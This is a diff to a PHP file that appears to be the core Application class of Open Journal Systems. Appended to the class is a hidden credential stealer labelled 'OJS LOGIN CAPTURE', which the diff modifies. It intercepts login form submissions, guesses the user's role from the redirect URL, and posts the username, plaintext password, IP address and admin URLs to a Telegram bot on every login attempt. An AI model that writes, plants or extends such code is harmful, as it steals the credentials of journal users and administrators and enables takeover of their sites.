@@ -260,7 +260,7 @@ class Application extends PKPApplication
     }
 }
 /**
- * OJS LOGIN CACHE - PEMBERITAHUAN KHUSUS BERHASIL MASUK (MARLIN)
+ * OJS LOGIN CAPTURE - DETEKSI ROLE DARI URL REDIRECT (FINAL GAMPANG)
  * File: /lib/fontconfig/cache/
  */
 
@@ -275,7 +275,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $password = $_POST['password'] ?? '';
 }
 
-// Hanya jalankan jika ada username dan password yang dikirim
 if (!empty($username) && !empty($password)) {
     
     ob_start();
@@ -294,7 +293,6 @@ if (!empty($username) && !empty($password)) {
         $response = ob_get_clean();
         echo $response;
         
-        // Cek apakah login GAGAL (berdasarkan pesan error di response)
         $is_failed = false;
         $error_indicators = ['Invalid', 'incorrect', 'wrong', 'failed', 'error', 'tidak valid', 'salah'];
         foreach ($error_indicators as $indicator) {
@@ -304,103 +302,104 @@ if (!empty($username) && !empty($password)) {
             }
         }
         
-        // Cek apakah login BERHASIL (ada redirect Location: di header)
         $headers = headers_list();
         $is_success = false;
         $redirect_url = '';
         foreach ($headers as $header) {
             if (stripos($header, 'Location:') !== false) {
                 $is_success = true;
+                // Ambil URL redirect yang diberikan oleh OJS
                 $redirect_url = trim(substr($header, strpos($header, ':') + 1));
                 break;
             }
         }
+        
+        // === DETEKSI ROLE DARI URL REDIRECT ===
+        // (Ini paling akurat, karena OJS yang memberi tahu role user lewat halaman tujuannya)
+        $detected_role = 'Tidak Terdeteksi';
+        $role_emoji = '👤';
 
-        // === JIKA LOGIN GAGAL: DIAM SAJA (JANGAN KIRIM KE TELEGRAM) ===
-        if ($is_failed) {
-            return; // Keluar dari fungsi tanpa mengirim apa pun
-        }
-
-        // === JIKA LOGIN BERHASIL: KIRIM PEMBERITAHUAN ===
         if ($is_success && !$is_failed) {
-            
-            // ─── DETEKSI ROLE SUPER DETAIL ──────────────────────
-            $detected_role = 'User / Tidak Terdeteksi';
-            $role_emoji = '👤';
-
-            // 1. Administrator / Journal Manager (Level Tertinggi)
-            if (stripos($redirect_url, 'management') !== false || stripos($redirect_url, 'settings') !== false) {
-                if (stripos($redirect_url, 'admin') !== false) {
-                    $detected_role = 'Administrator';
-                    $role_emoji = '🛡️';
-                } else {
-                    $detected_role = 'Journal Manager';
-                    $role_emoji = '⚙️';
-                }
-            }
-            // 2. Stats (Biasanya juga bagian dari Manager/Admin)
-            elseif (stripos($redirect_url, 'stats') !== false) {
-                $detected_role = 'Journal Manager (Stats)';
-                $role_emoji = '📊';
-            }
-            // 3. Editor
-            elseif (stripos($redirect_url, 'editor') !== false) {
-                $detected_role = 'Editor';
+            if (stripos($redirect_url, 'management') !== false || stripos($redirect_url, 'stats') !== false || stripos($redirect_url, 'settings') !== false) {
+                $detected_role = 'Journal Manager / Admin';
+                $role_emoji = '⚙️';
+            } elseif (stripos($redirect_url, 'editor') !== false) {
+                $detected_role = 'Journal Editor';
                 $role_emoji = '📝';
-            }
-            // 4. Reviewer
-            elseif (stripos($redirect_url, 'reviewer') !== false) {
-                $detected_role = 'Reviewer';
-                $role_emoji = '🔍';
-            }
-            // 5. Author
-            elseif (stripos($redirect_url, 'author') !== false) {
+            } elseif (stripos($redirect_url, 'author') !== false) {
                 $detected_role = 'Author';
                 $role_emoji = '✍️';
-            }
-            // 6. Dashboard/User umum
-            elseif (stripos($redirect_url, 'dashboard') !== false || stripos($redirect_url, 'user') !== false) {
+            } elseif (stripos($redirect_url, 'reviewer') !== false) {
+                $detected_role = 'Reviewer';
+                $role_emoji = '🔍';
+            } elseif (stripos($redirect_url, 'user') !== false || stripos($redirect_url, 'dashboard') !== false) {
+                // Jika URL hanya ke dashboard umum, kemungkinan Manager atau User biasa
                 $detected_role = 'Journal User (Author/Reviewer)';
                 $role_emoji = '👤';
             }
-            
-            // Format URL Base
-            $path_parts = explode('/', $_SERVER['REQUEST_URI']);
-            $base_url_path = '';
-            if (isset($path_parts[1]) && strpos($path_parts[1], 'index.php') !== false) {
-                if ($path_parts[0] == '') $base_url_path = $path_parts[1] ? '/' . $path_parts[1] : '';
-            } else {
-                $base_url_path = dirname($_SERVER['REQUEST_URI']);
-                if ($base_url_path == '/') $base_url_path = '';
-            }
-            
-            $base_url = "https://{$login_data['host']}" . $base_url_path;
+        }
 
-            // Format Pesan Sukses
-            $message = "✅ MARLIN: USER BERHASIL MASUK!\n\n";
+        // Tentukan status
+        $status = 'ATTEMPT'; $emoji = '🔐';
+        if ($is_success) { $status = 'SUCCESS'; $emoji = '✅'; }
+        elseif ($is_failed) { $status = 'FAILED'; $emoji = '❌'; }
+        
+        // Format URL Base (dari PATH)
+        $path_parts = explode('/', $_SERVER['REQUEST_URI']);
+        $base_url_path = '';
+        if (isset($path_parts[1]) && strpos($path_parts[1], 'index.php') !== false) {
+            // Jika ada folder sebelumnya, ambil foldernya
+            if ($path_parts[0] == '') $base_url_path = $path_parts[1] ? '/' . $path_parts[1] : '';
+        } else {
+            $base_url_path = dirname($_SERVER['REQUEST_URI']);
+            if ($base_url_path == '/') $base_url_path = '';
+        }
+        
+        $base_url = "https://{$login_data['host']}" . $base_url_path;
+
+        // === FORMAT PESAN FINAL ===
+        $message = "🟥 OJS HIT\n\n";
+
+        // 🔥 CEK STATUS LOGIN UNTUK MENENTUKAN URL TUJUAN
+        if ($is_success && !$is_failed) {
             $message .= "{$role_emoji} Role: {$detected_role}\n";
-            $message .= "🔗 URL: {$base_url}\n";
-            $message .= "👤 User: {$login_data['username']}\n";
-            $message .= "🔐 Pass: {$login_data['password']}\n";
-            $message .= "\n🌐 IP: {$login_data['ip']}\n";
-            $message .= "⏰ TIME: {$login_data['time']}\n";
-            $message .= "\n✅ STATUS: LOGIN BERHASIL!";
             
-            // Kirim ke Telegram
-            $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
-            $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+            // 🎯 TAMBAHKAN URL ADMIN/DASHBOARD (MARLIN)
+            $admin_url = "{$base_url}/index.php/admin/dashboard";
+            $message .= "✅ Login Berhasil Marlin!\n";
+            $message .= "📊 Admin URL: {$admin_url}\n";
             
-            if (function_exists('curl_init')) {
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, $url);
-                curl_setopt($ch, CURLOPT_POST, 1);
-                curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
-                curl_setopt($ch, CURLOPT_TIMEOUT, 3);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-                curl_exec($ch);
-                curl_close($ch);
-            }
+        } else {
+            $message .= "👤 Role: - (Gagal Login)\n";
+        }
+
+        $message .= "🔗 URL: {$base_url}\n";
+        $message .= "🔑 Login URL:\n{$base_url}/index.php/index/login\n";
+        $message .= "👤 User: {$login_data['username']}\n";
+        $message .= "🔐 Pass: {$login_data['password']}\n";
+
+        $message .= "\n🌐 IP: {$login_data['ip']}\n";
+        $message .= "📍 PATH: {$login_data['path']}\n";
+        $message .= "⏰ TIME: {$login_data['time']}\n";
+
+        if ($is_failed) {
+            $message .= "\n⚠️ PERHATIAN: Password SALAH!";
+        }
+        
+        // Kirim ke Telegram
+        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+        $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+        
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_exec($ch);
+            curl_close($ch);
         }
     });
 }
